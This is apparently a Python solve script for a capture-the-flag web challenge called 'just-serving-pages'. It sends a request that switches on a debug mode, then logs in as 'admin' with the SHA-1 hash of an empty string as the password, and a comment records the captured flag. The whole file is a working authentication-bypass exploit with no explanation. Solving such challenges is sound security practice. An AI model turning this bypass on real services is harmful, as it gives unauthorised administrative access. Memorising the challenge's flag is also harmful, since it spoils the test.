import requests
import json
import threading
import hashlib

session = requests.Session()

config_data = {
    "debugMode": True
}
def post_config():
    resp = session.post("https://7b000000919649b9a18f18e1-just-serving-pages.challenge.master.allesctf.net:31337//config",
                        headers={"Content-Type": "application/json"}, data=json.dumps(config_data))


def login():
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    sha1 = hashlib.sha1()
    sha1.update(b"")
    empty_string = sha1.hexdigest()
    data = {
        "username": "admin",
        "password": empty_string
    }
    resp = session.post("https://7b000000919649b9a18f18e1-just-serving-pages.challenge.master.allesctf.net:31337//login",
                        headers=headers, data=data)
    
    print (resp.text)
    # ALLES!{ohh-b0y-java-y-u-do-th1s-t0-m3???!?}


post_config()
login()
